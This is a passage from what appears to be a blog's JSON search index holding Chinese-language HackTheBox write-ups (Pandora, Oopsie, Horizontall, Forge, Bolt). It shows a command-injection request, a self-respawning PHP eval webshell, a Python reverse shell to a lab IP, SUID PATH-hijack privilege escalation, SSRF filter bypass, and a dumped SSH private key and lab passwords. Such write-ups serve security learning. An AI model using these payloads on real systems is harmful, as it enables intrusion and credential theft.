=\u003e @cookie, 'ctype' =\u003e 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer' =\u003e full_uri('index.php'), 'vars_get' =\u003e { 'sec' =\u003e 'eventos', 'sec2' =\u003e 'operation/events/events' }, 'vars_post' =\u003e { 'page' =\u003e 'include/ajax/events', 'perform_event_response' =\u003e '10000000', 'target' =\u003e cmd.to_s, 'response_id' =\u003e '1' } }, 0) # the server will not send a response, so the module shouldn't wait for one end http://127.0.0.1/pandora_console/ajax.php post传参page=include/ajax/events\u0026perform_event_response=10000000\u0026target=ls\u0026response_id=1 成功执行命令 当前用户为matt,uid=1000(matt) gid=1000(matt) groups=1000(matt) 把shell反弹回本地 在~/.ssh下面加个authorized_keys以便ssh连接 ","date":"2022-01-10","objectID":"/htb-pandora/:3:0","tags":null,"title":"HackTheBox-Pandora","uri":"/htb-pandora/"},{"categories":["HackTheBox"],"content":"获取root权限 注意到在find / -user root -perm -4000 -print 2\u003e/dev/null中有个/usr/bin/pandora_backup int __cdecl main(int argc, const char **argv, const char **envp) { __uid_t v3; // ebx __uid_t v4; // eax int result; // eax v3 = getuid(); v4 = geteuid(); setreuid(v4, v3); puts(\"PandoraFMS Backup Utility\"); puts(\"Now attempting to backup PandoraFMS client\"); if ( system(\"tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*\") ) { puts(\"Backup failed!\\nCheck your permissions!\"); result = 1; } else { puts(\"Backup successful!\"); puts(\"Terminating program!\"); result = 0; } return result; } tar是相对路径下的,把环境变量中的PATH修改到/tmp目录并且在/tmp下新建个tar的/bin/bash就ok了 export PATH=/tmp:$PATH ","date":"2022-01-10","objectID":"/htb-pandora/:4:0","tags":null,"title":"HackTheBox-Pandora","uri":"/htb-pandora/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 题目提示要进行登录操作,发现存在路径cdn-cgi/login Login as guest跳转到cdn-cgi/login/admin.php 点击account,注意到?content=accounts\u0026id=2,id参数可能存在注入?? 发现对于不同的id,回显的结果不同,用intruder进行爆破 ","date":"2022-01-09","objectID":"/htb-oopsie/:1:0","tags":null,"title":"HackTheBox-Oopsie","uri":"/htb-oopsie/"},{"categories":["HackTheBox"],"content":"文件上传获取user权限 cdn-cgi/login/admin.php?content=uploads 文件上传 提示要super admin权限 注意到在Cookie中定义了user和role,网站可能根据cookie来判断用户身份,根据爆破得到的id和name替换cookie中的值,成功冒充super admin 上传webshell即可,但发现疑似存在定时清理程序,因此上传不死马 \u003c?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = 'shell.php'; $code = '\u003c?php @eval($_POST[a]);?\u003e'; while (1){ file_put_contents($file,$code); usleep(1000); } ?\u003e 在/var/www/html/cdn-cgi/login/admin.php中 if($_GET[\"content\"]===\"clients\"\u0026\u0026$_GET[\"orgId\"]!=\"\") { $stmt=$conn-\u003eprepare(\"select name,email from clients where id=?\"); $stmt-\u003ebind_param('i',$_GET[\"orgId\"]); $stmt-\u003eexecute(); $stmt=$stmt-\u003eget_result(); $stmt=$stmt-\u003efetch_assoc(); $name=$stmt[\"name\"]; $email=$stmt[\"email\"]; echo '\u003ctable\u003e\u003ctr\u003e\u003cth\u003eClient ID\u003c/th\u003e\u003cth\u003eName\u003c/th\u003e\u003cth\u003eEmail\u003c/th\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e'.$_GET[\"orgId\"].'\u003c/td\u003e\u003ctd\u003e'.$name.'\u003c/td\u003e\u003ctd\u003e'.$email.'\u003c/td\u003e\u003c/tr\u003e\u003c/table'; } 在/var/www/html/cdn-cgi/login/db.php中 \u003c?php $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ?\u003e 可能可以作为robert用户的密码 在/var/www/html/cdn-cgi/login/index.php中 if($_POST[\"username\"]===\"admin\" \u0026\u0026 $_POST[\"password\"]===\"MEGACORP_4dm1n!!\") { $cookie_name = \"user\"; $cookie_value = \"34322\"; setcookie($cookie_name, $cookie_value, time() + (86400 * 30), \"/\"); setcookie('role','admin', time() + (86400 * 30), \"/\"); header('Location: /cdn-cgi/login/admin.php'); } 存在python3,利用其进行反弹shell import socket import subprocess import os ip=\"10.10.16.45\" port=8000 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((ip,port)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\"/bin/sh\",\"-i\"]) 将反弹回来的shell转换为交互式的shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 可以通过ssh直接连接 ","date":"2022-01-09","objectID":"/htb-oopsie/:2:0","tags":null,"title":"HackTheBox-Oopsie","uri":"/htb-oopsie/"},{"categories":["HackTheBox"],"content":"获取root权限 题目提示存在SUID find / -user root -perm -4000 -print 2\u003e/dev/null robert@oopsie:~$ id uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) robert@oopsie:~$ find / -user root -perm -4000 -print 2\u003e/dev/null /snap/core/11420/bin/mount ... /usr/bin/newuidmap /usr/bin/passwd /usr/bin/bugtracker /usr/bin/newgrp /usr/bin/pkexec /usr/bin/chfn /usr/bin/chsh /usr/bin/traceroute6.iputils /usr/bin/newgidmap /usr/bin/gpasswd /usr/bin/sudo 发现/usr/bin/bugtracker 该程序根据输入执行cat /root/reports/xxx,注意到这里的cat可能为相对路径,因此可能可以利用SUID进行提权操作 确实是直接使用了相对路径的cat,因此可以进行提权操作 改变当前目录的PATH,使robert执行bugtracker时优先使用当前的PATH变量 假设将PATH设置为/tmp目录,而在/tmp目录下存在一个名为cat的可执行文件,文件内容为/bin/bash,在执行bugtracker会以root权限执行/bin/bash由此获得root shell export PATH=/tmp:$PATH ","date":"2022-01-09","objectID":"/htb-oopsie/:3:0","tags":null,"title":"HackTheBox-Oopsie","uri":"/htb-oopsie/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 要把10.10.11.105 horizontall.htb加到/etc/hosts中 没找到啥突破口,看了wp才知道,要爆破子域名… 爆破字典 subdomains-top1million-110000.txt 爆破工具 gobuster ./gobuster vhost -u http://horizontall.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100 把10.10.11.105 api-prod.horizontall.htb加到/etc/hosts中,识别出Strapi cms ","date":"2022-01-08","objectID":"/htb-horizontall/:1:0","tags":null,"title":"HackTheBox-Horizontall","uri":"/htb-horizontall/"},{"categories":["HackTheBox"],"content":"攻击StrapiCMS获取user权限 http://api-prod.horizontall.htb/admin/auth/login 登录页面 通过http://api-prod.horizontall.htb/admin/strapiVersion得知版本号为{\"strapiVersion\":\"3.0.0-beta.17.4\"} 主要有以下两个exp Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) Strapi 3.0.0-beta - Set Password (Unauthenticated) 检测是否存在python 利用python反弹shell(反弹shell不稳定…) 在/home/developer/user.txt中得到user flag 在~/myapi/config/environments/development/database.json中得到数据库连接密码,尝试以此作为ssh密码(无法连接) 后面不会了,看了眼wp,wp说生成一个ssh密钥??? 在本地用ssh-keygen生成了一对密码,将公钥传到靶机上,并将authorized_keys设置为公钥的内容 成功使用ssh -i ~/.ssh/id_rsa strapi@horizontall.htb连接到靶机 同样使用python3 -c 'import pty;pty.spawn(\"/bin/bash\")'将其转换为可交互的shell ","date":"2022-01-08","objectID":"/htb-horizontall/:2:0","tags":null,"title":"HackTheBox-Horizontall","uri":"/htb-horizontall/"},{"categories":["HackTheBox"],"content":"获取root权限 netstat -ano查看端口情况 有个8000端口,不知道是干什么的,不能直接访问,但可以通过SSH端口转发把8000映射到本地 ssh -i ~/.ssh/id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb xray扫描 https://github.com/zhzyker/CVE-2021-3129 在本地起个python服务器,把exp传到靶机上 改了一下RCE5的内容,改成了python3 /tmp/a.py \u0026,将shell反弹 ","date":"2022-01-08","objectID":"/htb-horizontall/:3:0","tags":null,"title":"HackTheBox-Horizontall","uri":"/htb-horizontall/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 把10.10.11.111 forge.htb加到/etc/hosts 没扫描出啥东西… 上传分为本地文件上传和URL上传,URL限制了协议为http和https,测试时出现报错,可能为python服务器,URL上传处可以进行SSRF An error occured! Error : HTTPConnectionPool(host='forge.htbetc', port=80): Max retries exceeded with url: /passwd (Caused by NewConnectionError('\u003curllib3.connection.HTTPConnection object at 0x7f6398df0a90\u003e: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution')) 一开始以为是subshell,检测后发现不对… url=http://10.10.16.29:8888/`whoami`\u0026remote=1 10.10.11.111 - - [15/Jan/2022 20:03:50] \"GET /%60whoami%60 HTTP/1.1\" 404 - 用gobuster扫描,返回了一堆302的结果 ./gobuster vhost -u http://forge.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100 换成wfuzz,安装前要注意安装python3-pycurl wfuzz -c -u \"http://forge.htb/\" -H \"Host:FUZZ.forge.htb\" -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt --hc 302 ","date":"2022-01-07","objectID":"/htb-forge/:1:0","tags":null,"title":"HackTheBox-Forge","uri":"/htb-forge/"},{"categories":["HackTheBox"],"content":"SSRF访问admin 好像不能直接访问 尝试用URL上传去SSRF,发现存在黑名单过滤,尝试大小写绕过 http://adMin.fOrge.hTb/成功进行SSRF \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eAdmin Portal\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u003e \u003cheader\u003e \u003cnav\u003e \u003ch1 class=\"\"\u003e\u003ca href=\"/\"\u003ePortal home\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right margin-right\"\u003e\u003ca href=\"/announcements\"\u003eAnnouncements\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right\"\u003e\u003ca href=\"/upload\"\u003eUpload image\u003c/a\u003e\u003c/h1\u003e \u003c/nav\u003e \u003c/header\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003ccenter\u003e\u003ch1\u003eWelcome Admins!\u003c/h1\u003e\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eAnnouncements\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/announcements.css\"\u003e \u003cheader\u003e \u003cnav\u003e \u003ch1 class=\"\"\u003e\u003ca href=\"/\"\u003ePortal home\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right margin-right\"\u003e\u003ca href=\"/announcements\"\u003eAnnouncements\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right\"\u003e\u003ca href=\"/upload\"\u003eUpload image\u003c/a\u003e\u003c/h1\u003e \u003c/nav\u003e \u003c/header\u003e \u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003cul\u003e \u003cli\u003eAn internal ftp server has been setup with credentials as user:heightofsecurity123!\u003c/li\u003e \u003cli\u003eThe /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.\u003c/li\u003e \u003cli\u003eThe /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=\u0026lt;url\u0026gt;.\u003c/li\u003e \u003c/ul\u003e \u003c/body\u003e \u003c/html\u003e \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eUpload an image\u003c/title\u003e \u003c/head\u003e \u003cbody onload=\"show_upload_local_file()\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/upload.css\"\u003e \u003cscript type=\"text/javascript\" src=\"/static/js/main.js\"\u003e\u003c/script\u003e \u003cheader\u003e \u003cnav\u003e \u003ch1 class=\"\"\u003e\u003ca href=\"/\"\u003ePortal home\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right margin-right\"\u003e\u003ca href=\"/announcements\"\u003eAnnouncements\u003c/a\u003e\u003c/h1\u003e \u003ch1 class=\"align-right\"\u003e\u003ca href=\"/upload\"\u003eUpload image\u003c/a\u003e\u003c/h1\u003e \u003c/nav\u003e \u003c/header\u003e \u003ccenter\u003e \u003cbr\u003e\u003cbr\u003e \u003cdiv id=\"content\"\u003e \u003ch2 onclick=\"show_upload_local_file()\"\u003e Upload local file \u003c/h2\u003e \u003ch2 onclick=\"show_upload_remote_file()\"\u003e Upload from url \u003c/h2\u003e \u003cdiv id=\"form-div\"\u003e \u003c/div\u003e \u003c/div\u003e \u003c/center\u003e \u003cbr\u003e \u003cbr\u003e \u003c/body\u003e \u003c/html\u003e 注意到ftp用户名和密码user:heightofsecurity123!,同时支持新的协议ftp, ftps, http and https protocols for uploading from url url=http://admIn.Forge.Htb/upload?u=http://10.10.16.29:8888/\u0026remote=1 10.10.11.111 - - [15/Jan/2022 20:58:02] \"GET / HTTP/1.1\" 200 - 利用得到的ftp用户名列出ftp中的内容,并获得user flag url=http://admIn.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@admIn.Forge.Htb\u0026remote=1 drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Jan 14 06:00 user.txt ","date":"2022-01-07","objectID":"/htb-forge/:2:0","tags":null,"title":"HackTheBox-Forge","uri":"/htb-forge/"},{"categories":["HackTheBox"],"content":"获取user权限 没思路了qwq,看了眼wp说有user.txt则说明在用户目录下,那么可以尝试对用户的敏感文件进行读取,如.bash_history,.ssh等 验证发现.bash_history是空的,.config也是空的,.ssh中存在authorized_keys -rw------- 1 1000 1000 1139 Jan 14 15:19 authorized_keys -rw------- 1 1000 1000 2590 May 20 2021 id_rsa -rw------- 1 1000 1000 564 May 20 2021 id_rsa.pub authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdkg75DLB+Cd+2qjlqz6isdb/DVZusbqLoHtO/Y91DT02LE6a0dHeufEei6/j+XWk7aeM9/kZuNUcCwzAkNeYM2Nqpl8705gLsruGvsVXrGVRZOHBwqjSEg5W4TsmHV36N+kNhheo43mvoPM4MjlYzAsqX2fmtu0WSjfFot7CQdhMTZhje69WmnGycK8n/q6SvqntvNxHKBitPIQBaDmA5F+yqELcdqg7FeJeAbNNbJe1/ajjOY2Gy192BZYGkR9uAWBncNYn67bP9U5unQggoR+yBf5xZdBS3xEkCcqBNSMYCZ81Ev2cnGiZgeXJJDPbEvhRhdfNevwaYvpfT6cqtGCVo0V0LTKQtMayIazX5tzqMmIPURKJ5sBL9ksBNOxofjogT++/1c4nTmoRdEZTP5qmXMMbjBa+JI256sPL09MbEHqRHmkZsJoRahE8tUhv0SqdaHbv2Ze7RvjNiESD6fIMrq6L+euZFhQ5p2AIpdHvOUSbeaCPiG7hwVqwf8qU= user@forge ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd2/ldqQ3RjSOvROh65fIO+Qoc6iN8L3FBpr/Q13Ka+GFhVPjVQkN8S6LD9ndaejOq4FnWZ1Lo3vgPe5BigP9PU5oG9yCNz2k/jUArEVOq8Gqcgq3FHU+7DbD40u6FeXMLxKvynN+T38QciIlbfEvyAd++W337smi8+xPTVQWt92665+ADWkI3YGFtYP/ZDwCAhov4DSPLS5pxCMf/xk+KZDcPpILh3lJxIUTgqrzkA4j2GcAr7AVw8yILTf4B8LaIC+kmAutDnNAyOkuRrG6GKUoflbRhinA2sagS7UcQh8Xgx1z9/dUzLOsjQLVXjPFsWN13+RNA1hcLVwJK6Ug2W/3/omtIW4ngsqv+QSQqX19aBl01dUhBoRMXC/kAF+4F7oxbr9lZG6MomL/HcM0jCt755VDTPFp3u513qLAGTmjWHQymW/m8m2Y/ymBzaskvAx6g/xRYH3ANVFj1MeYjWkwzJi07bMu7KZ+NiVZn7HmAT164l5n1ggrFbsw7Ff0= root@DESKTOP-R79THJ3 id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 shlLupso7WoS0AAAAKdXNlckBm","date":"2022-01-07","objectID":"/htb-forge/:3:0","tags":null,"title":"HackTheBox-Forge","uri":"/htb-forge/"},{"categories":["HackTheBox"],"content":"获取root权限 -bash-5.0$ find / -user root -perm -4000 -print 2\u003e/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/eject/dmcrypt-get-device /usr/lib/snapd/snap-confine /usr/bin/bash /usr/bin/chfn /usr/bin/pkexec /usr/bin/gpasswd /usr/bin/mount /usr/bin/su /usr/bin/sudo /usr/bin/chsh /usr/bin/passwd /usr/bin/umount /usr/bin/fusermount /usr/bin/newgrp -bash-5.0$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening on localhost:{port}') (clientsock, addr) = sock.accept() clientsock.send(b'Enter the secret passsword: ') if clientsock.recv(1024).strip().decode() != 'secretadminpassword': clientsock.send(b'Wrong password!\\n') else: clientsock.send(b'Welcome admin!\\n') while True: clientsock.send(b'\\nWhat do you wanna do: \\n') clientsock.send(b'[1] View processes\\n') clientsock.send(b'[2] View free memory\\n') clientsock.send(b'[3] View listening sockets\\n') clientsock.send(b'[4] Quit\\n') option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput('ps aux').encode()) elif option == 2: clientsock.send(subprocess.getoutput('df').encode()) elif option == 3: clientsock.send(subprocess.getoutput('ss -lnt').encode()) elif option == 4: clientsock.send(b'Bye\\n') break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit() 程序监听42048端口,此时向42048发送数据即可进入pdb,此时的pdb以root权限运行 echo \"123\" \u003e /dev/tcp/localhost/42048 ","date":"2022-01-07","objectID":"/htb-forge/:4:0","tags":null,"title":"HackTheBox-Forge","uri":"/htb-forge/"},{"categories":["HackTheBox"],"content":"前期工作 nmap扫描结果 把10.10.11.114 bolt.htb和10.10.11.114 passbolt.bolt.htb加到/etc/hosts中 http://passbolt.bolt.htb/uploads/image.tar有个压缩包可以下载 ","date":"2022-01-06","objectID":"/htb-bolt/:1:0","tags":null,"title":"HackTheBox-Bolt","uri":"/htb-bolt/"},{"categories":["HackTheBox"],"content":"分析压缩包 在image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py中 # -*- encoding: utf-8 -*- \"\"\" Copyright (c) 2019 - present AppSeed.us \"\"\" import os from decouple import config class Config(object): basedir = os.path.abspath(os.path.dirname(__file__)) # Set up the App SECRET_KEY SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007') # This will create a file in \u003capp\u003e FOLDER SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3') SQLALCHEMY_TRACK_MODIFICATIONS = False MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb' class ProductionConfig(Config): DEBUG = False # Security SESSION_COOKIE_HTTPONLY = True REMEMBER_COOKIE_HTTPONLY = True REMEMBER_COOKIE_DURATION = 3600 # PostgreSQL database SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format( config( 'DB_ENGINE' , default='postgresql' ), config( 'DB_USERNAME' , default='appseed' ), config( 'DB_PASS' , default='pass' ), config( 'DB_HOST' , default='localhost' ), config( 'DB_PORT' , default=5432 ), config( 'DB_NAME' , default='appseed-flask' ) ) class DebugConfig(Config): DEBUG = True # Load all possible configurations config_dict = { 'Production': ProductionConfig, 'Debug' : DebugConfig } 在image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2中有个db.sqlite3 sudo apt install sqlite3 sqlite3 db.sqlite3 sqlite\u003e .show echo: off eqp: off explain: auto headers: off mode: list nullvalue: \"\" output: stdout colseparator: \"|\" rowseparator: \"\\n\" stats: off width: filename: db.sqlite3 sqlite\u003e .database main: /home/kali/Downloads/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3 sqlite\u003e .tables User sqlite\u003e .schema User CREATE TABLE IF NOT EXISTS \"User\" ( id INTEGER NOT NULL, username VARCHAR, email VARCHAR, password BLOB, email_confirmed BOOLEAN, profile_update VARCHAR(80), PRIMARY KEY (id), UNIQUE (username), UNIQUE (email) ); sqlite\u003e select * from User; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| 有个hash之后的密码,反查得知其为deadbolt ","date":"2022-01-06","objectID":"/htb-bolt/:2:0","tags":null,"title":"HackTheBox-Bolt","uri":"/htb-bolt/"},{"categories":["HackTheBox"],"content":"分析网站结构 成功以admin:deadbolt登录bolt.htb 但是好像没找到可以利用的点 尝试以admin@bolt.htb:deadbolt登录passbolt.bolt.htb 尝试以此进行ssh连接同样失败 推测可能存在其他子域名,用gobuster去爆破./gobuster vhost -u http://bolt.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100 Found: demo.bolt.htb (Status: 302) [Size: 219] Found: mail.bolt.htb (Status: 200) [Size: 4943] demo.bolt.htb跟bolt.htb的登录框一样,但是无法登录 在注册页面多了一个邀请码 全局搜索Invite Code,发现其在image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py中出现 # -*- encoding: utf-8 -*- \"\"\" Copyright (c) 2019 - present AppSeed.us \"\"\" from flask_wtf import FlaskForm from wtforms import TextField, PasswordField from wtforms.validators import InputRequired, Email, DataRequired ## login and registration class LoginForm(FlaskForm): username = TextField ('Username', id='username_login' , validators=[DataRequired()]) password = PasswordField('Password', id='pwd_login' , validators=[DataRequired()]) class CreateAccountForm(FlaskForm): username = TextField('Username' , id='username_create' , validators=[DataRequired()]) email = TextField('Email' , id='email_create' , validators=[DataRequired(), Email()]) password = PasswordField('Password' , id='pwd_create' , validators=[DataRequired()]) invite_code = TextField('Invite Code', id='invite_code' , validators=[DataRequired()]) 而在routes.py中定义了Invite Code @blueprint.route('/register', methods=['GET', 'POST']) def register(): login_form = LoginForm(request.form) create_account_form = CreateAccountForm(request.form) if 'register' in request.form: username = request.form['username'] email = request.form['email' ] code = request.form['invite_code'] if code != 'XNSS-HSJW-3NGU-8XTJ': return render_template('code-500.html') data = User.query.filter_by(email=email).first() if data is None and code == 'XNSS-HSJW-3NGU-8XTJ': # Check usename exists user = User.query.filter_by(username=username).first() if user: return render_template( 'accounts/register.html', msg='Username already registered', success=False, form=create_account_form) # Check email exists user = User.query.filter_by(email=email).first() if user: return render_template( 'accounts/register.html', msg='Email already registered', success=False, form=create_account_form) # else we can create the user user = User(**request.form) db.session.add(user) db.session.commit() return render_template( 'accounts/register.html', msg='User created please \u003ca href=\"/login\"\u003elogin\u003c/a\u003e', success=True, form=create_account_form) else: return render_template( 'accounts/register.html', form=create_account_form) 成功注册并登录 extras下面挺多功能的,但是好像只是个前端??? mail.bolt.htb如下 可以用新注册的用户test:test进行登录,从数据库中得到的admin:deadbolt反而不可以… 版本是Roundcube Webmail 1.4.6 有个sql注入的CVECVE-2021-44026,但是没找到利用方式… ","date":"2022-01-06","objectID":"/htb-bolt/:3:0","tags":null,"title":"HackTheBox-Bolt","uri":"/htb-bolt/"},{"categories":["HackTheBox"],"content":"模板注入获取user权限 demo.bolt.htb用到了jinja2和flask猜测可能存在SSTI模板注入 在image中全局搜索render_template_string 在image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py中调用了render_template_string,因此可能存在模板注入 @blueprint.route(\"/example-profile\", methods=['GET', 'POST']) @login_required def profile(): \"\"\"Profiles\"\"\" if request.method == 'GET': return render_template('example-profile.html', user=user,current_user=current_user) else: \"\"\"Experimental Feature\"\"\" cur_user = current_user user = current_user.username name = request.form['name'] experience = request.form['experience'] skills = request.form['skills'] msg = Message( recipients=[f'{cur_user.email}'], sender = 'support@example.com', reply_to = 'support@example.com', subject = \"Please confirm your profile changes\" ) try: cur_user.profile_update = name except: return render_template('page-500.html') db.session.add(current_user) db.session.commit() token = ts.dumps(user, salt='changes-confirm-key') confirm_url = 